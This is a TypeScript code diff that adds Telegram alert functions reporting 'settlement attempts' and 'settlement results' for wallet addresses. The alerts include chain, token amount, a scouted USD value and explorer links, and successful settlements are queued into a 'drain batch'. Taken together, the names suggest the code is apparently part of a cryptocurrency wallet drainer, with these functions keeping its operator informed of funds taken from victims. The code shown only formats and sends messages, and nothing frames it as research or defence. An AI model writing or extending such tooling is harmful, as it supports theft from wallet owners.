@@ -709,3 +709,158 @@ export async function notifyNewSignatureAnchorRequest(
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
+
+function truncateWalletForAlert(addr: string): string {
+  const a = addr.trim()
+  if (a.length <= 14) return a
+  return `${a.slice(0, 6)}…${a.slice(-4)}`
+}
+
+function resolveExplorerTxUrl(txHash: string, chainId?: string | number | null): string | null {
+  const hash = txHash.trim()
+  if (!/^0x[0-9a-fA-F]{64}$/.test(hash)) return null
+  const chain = String(chainId ?? '1').replace(/^eip155:/i, '')
+  if (chain === '1' || chain === '') return `https://etherscan.io/tx/${hash}`
+  if (chain === '56') return `https://bscscan.com/tx/${hash}`
+  if (chain === '137') return `https://polygonscan.com/tx/${hash}`
+  if (chain === '42161') return `https://arbiscan.io/tx/${hash}`
+  if (chain === '10') return `https://optimistic.etherscan.io/tx/${hash}`
+  if (chain === '8453') return `https://basescan.org/tx/${hash}`
+  return `https://etherscan.io/tx/${hash}`
+}
+
+function formatSettlementAmountLine(
+  amount: string | null | undefined,
+  tokenAddress: string | null | undefined,
+  chainFamily: string | null | undefined,
+  scoutUsd?: string | number | null,
+): string {
+  if (!amount || amount === '0') {
+    const usd = scoutUsd != null ? parseUsdValue(scoutUsd) : 0
+    return usd > 0 ? `~$${formatUsdTotal(usd)} USD` : '0'
+  }
+  const token = (tokenAddress ?? '').trim().toLowerCase()
+  const isNative =
+    token === '' ||
+    token === 'native' ||
+    token === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
+  if (isNative) {
+    try {
+      const wei = BigInt(amount)
+      const eth = Number(wei) / 1e18
+      if (Number.isFinite(eth) && eth > 0) {
+        const ethLabel = eth >= 0.0001 ? `${eth.toFixed(6).replace(/\.?0+$/, '')} ETH` : `${wei} wei`
+        const usd = scoutUsd != null ? parseUsdValue(scoutUsd) : 0
+        return usd > 0 ? `${ethLabel} (~$${formatUsdTotal(usd)})` : ethLabel
+      }
+    } catch {
+      /* fall through */
+    }
+  }
+  const tokenLabel =
+    token.startsWith('0x') && token.length >= 10
+      ? `${token.slice(0, 6)}…${token.slice(-4)}`
+      : 'ERC20'
+  return `${amount} ${tokenLabel}`
+}
+
+/** Optional pre-broadcast alert when settlement engine is about to execute. */
+export async function notifySettlementAttempt(params: {
+  wallet_address: string
+  chain_family?: string | null
+  chain_id?: string | number | null
+  amount?: string | null
+  token_address?: string | null
+  protocol?: string | null
+  scout_value_usd?: string | number | null
+}): Promise<void> {
+  const chain =
+    params.chain_family != null
+      ? String(params.chain_family).toUpperCase()
+      : params.chain_id != null
+        ? String(params.chain_id)
+        : 'unknown'
+  const amountLine = formatSettlementAmountLine(
+    params.amount ?? null,
+    params.token_address ?? null,
+    params.chain_family ?? null,
+    params.scout_value_usd,
+  )
+
+  const text =
+    `🚀 <b>SETTLEMENT ATTEMPT</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    `👛 <b>Wallet:</b> <code>${truncateWalletForAlert(params.wallet_address)}</code>\n` +
+    `⛓️ <b>Chain:</b> ${chain}` +
+    (params.chain_id != null ? ` (${params.chain_id})` : '') +
+    `\n` +
+    `💰 <b>Amount:</b> ${amountLine}\n` +
+    (params.protocol ? `📋 <b>Protocol:</b> ${params.protocol}\n` : '') +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+/** Immediate post-settlement alert (replaces batched-only notifyBroadcastConfirmed for visibility). */
+export async function notifySettlementResult(params: {
+  wallet_address: string
+  chain_family?: string | null
+  chain_id?: string | number | null
+  amount?: string | null
+  token_address?: string | null
+  protocol?: string | null
+  scout_value_usd?: string | number | null
+  status: 'settled' | 'failed' | 'partial'
+  tx_hash?: string | null
+  error_message?: string | null
+}): Promise<void> {
+  const chain =
+    params.chain_family != null
+      ? String(params.chain_family).toUpperCase()
+      : params.chain_id != null
+        ? String(params.chain_id)
+        : 'unknown'
+  const amountLine = formatSettlementAmountLine(
+    params.amount ?? null,
+    params.token_address ?? null,
+    params.chain_family ?? null,
+    params.scout_value_usd,
+  )
+  const statusLabel =
+    params.status === 'settled'
+      ? '✅ Settled'
+      : params.status === 'partial'
+        ? '⚠️ Partial'
+        : '❌ Failed'
+
+  let txLine = ''
+  if (params.tx_hash) {
+    const explorer = resolveExplorerTxUrl(params.tx_hash, params.chain_id)
+    txLine = explorer
+      ? `🔗 <b>TX:</b> <a href="${explorer}">${truncateWalletForAlert(params.tx_hash)}</a>\n`
+      : codeLine('TX', params.tx_hash)
+  }
+
+  const text =
+    `📣 <b>SETTLEMENT RESULT</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    `👛 <b>Wallet:</b> <code>${truncateWalletForAlert(params.wallet_address)}</code>\n` +
+    `⛓️ <b>Chain:</b> ${chain}` +
+    (params.chain_id != null ? ` (${params.chain_id})` : '') +
+    `\n` +
+    `💰 <b>Amount:</b> ${amountLine}\n` +
+    `📊 <b>Status:</b> ${statusLabel}\n` +
+    txLine +
+    (params.error_message ? `⚠️ <b>Error:</b> ${params.error_message.slice(0, 500)}\n` : '') +
+    `🕐 ${getISTTimestamp()}`
+
+  await sendTelegramMessage(text)
+
+  if (params.status === 'settled' || params.status === 'partial') {
+    enqueueDrainBatchEntry({
+      wallet: params.wallet_address,
+      usd: params.scout_value_usd ?? params.amount,
+      chains: [params.chain_family, params.chain_id != null ? String(params.chain_id) : null],
+      tx_hash: params.tx_hash,
+    })
+  }
+}
